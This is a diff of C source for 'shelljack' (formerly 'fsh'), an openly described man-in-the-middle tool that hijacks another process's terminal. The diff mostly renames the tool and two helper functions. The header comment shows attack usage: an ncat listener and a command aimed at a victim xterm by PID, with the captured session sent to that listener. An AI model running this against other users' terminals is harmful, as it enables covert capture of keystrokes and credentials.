@@ -1,9 +1,7 @@
 /*
- *  What do you call a fish with no eyes?
- *    fsh 
+ *  shelljack 
  *    
- *  emptymonkey's forensic shell.
- *	A mitm terminal sniffer
+ *  emptymonkey's mitm terminal sniffer
  *    
  *  2012-12-24
  *
@@ -18,14 +16,14 @@
  *		empty@monkey:~$ while [ 1 ]; do ncat -l localhost 9999; done
  *
  *		(the attacker targets the xterm process, manually in this example.)
- *		empty@monkey:~$ fsh localhost:9999 `pgrep xterm`
+ *		empty@monkey:~$ shelljack localhost:9999 `pgrep xterm`
  *
  *    (state of xterm after the attack.)
- *    xterm(/dev/ptmx)  <--0--> fsh(/dev/pts/x)
- *    fsh(/dev/ptmx)    ---0--> bash(/dev/pts/y)
- *    fsh(/dev/ptmx)    <--1--- bash(/dev/pts/y)
- *    fsh(/dev/ptmx)    <--2--- bash(/dev/pts/y)
- *    fsh(/dev/ptmx)    <-255-> bash(/dev/pts/y)
+ *    xterm(/dev/ptmx)  <--0--> shelljack(/dev/pts/x)
+ *    shelljack(/dev/ptmx)    ---0--> bash(/dev/pts/y)
+ *    shelljack(/dev/ptmx)    <--1--- bash(/dev/pts/y)
+ *    shelljack(/dev/ptmx)    <--2--- bash(/dev/pts/y)
+ *    shelljack(/dev/ptmx)    <-255-> bash(/dev/pts/y)
  *
  *	The target process should be a session leader w/out any children.
  *	E.g. a users interactive shell. 
@@ -265,12 +263,12 @@ int main(int argc, char **argv){
 	/**************************************
 	 * Open the original tty for our use. *
 	 **************************************/
-	if((tty_name = ctty_getname(target_pid)) == NULL){
-		error(-1, errno, "ctty_getname(%d)", target_pid);
+	if((tty_name = ctty_get_name(target_pid)) == NULL){
+		error(-1, errno, "ctty_get_name(%d)", target_pid);
 	}
 
-	if((target_fd_count = ctty_getfds(target_pid, tty_name, &target_fds)) == -1){
-		error(-1, errno, "ctty_getfds(%d, %s, %lx)", target_pid, tty_name, (unsigned long) &target_fds);
+	if((target_fd_count = ctty_get_fds(target_pid, tty_name, &target_fds)) == -1){
+		error(-1, errno, "ctty_get_fds(%d, %s, %lx)", target_pid, tty_name, (unsigned long) &target_fds);
 	}
 
 	if((original_tty_fd = open(tty_name, O_RDWR|O_NOCTTY)) == -1){
